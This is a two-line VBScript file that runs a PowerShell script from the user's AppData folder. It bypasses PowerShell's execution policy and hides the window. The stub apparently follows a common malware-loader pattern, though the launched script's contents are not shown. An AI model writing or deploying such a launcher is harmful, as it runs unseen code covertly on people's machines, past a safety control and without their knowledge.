Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -File ""%appdata%\Grok\Nvs.ps1""", 0, True
